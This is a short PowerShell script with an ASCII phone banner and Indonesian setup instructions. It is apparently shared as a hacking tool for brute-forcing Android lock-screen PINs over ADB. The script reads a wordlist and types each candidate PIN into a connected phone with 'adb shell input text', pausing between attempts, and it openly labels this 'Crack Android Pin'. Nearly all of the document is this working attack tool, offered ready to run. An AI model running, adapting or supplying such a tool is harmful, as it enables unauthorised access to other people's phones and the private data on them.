$CodeNull = $null
$phone = @('

  __
 |  |_______
 | ________ |
 ||        ||
 ||  PIN?  ||
 ||  ADB?  ||
 ||________||
 | \_|__|_/ |
 | |_|__|_| |
 | |_|__|_| |
 \__________/

 Coded : Greenhatx
 Git : github.com/hackdexor
 Yt : youtube.com/greenhatx

 Tutorial :

 -> Install Adb Via Desktop + Usb Pengisi Daya Handphone + Tancapkan di Hp dan Laptop
 -> Aktifkan Debungging Hp Cara https://developer.android.com/studio/debug/dev-options?hl=id
 -> Masukan Command Di Powershell .\adb.exe usb Akan Otomatis Merestart koneksi!
 -> Masukan Command Di Powershell .\adb.exe devices Jika Sudah Terdapat "Device" Berarti Sudah Konek!
 -> Dan Selamat Uji Coba!...

 format BruteCodePin.ps1

')
$phone

         Write-Output ""
         $WordKey = Read-Host -Prompt " KeyCode list "
         $Sleeping = Read-Host -Prompt " Beri Jeda "
         $KeyType = Get-Content $WordKey
         Write-Output ""

         foreach ($a in $KeyType){
         if ($CodeNull -eq $null){
            Write-Host "[$a] Crack Android Pin... " -F Cyan
            .\adb.exe shell input text $a 
            .\adb.exe shell input press y
            Write-Host "[!] wait $Sleeping seconds... " -F Red
            Start-Sleep -Seconds $Sleeping | Out-Null

         }
         
         }      
          
         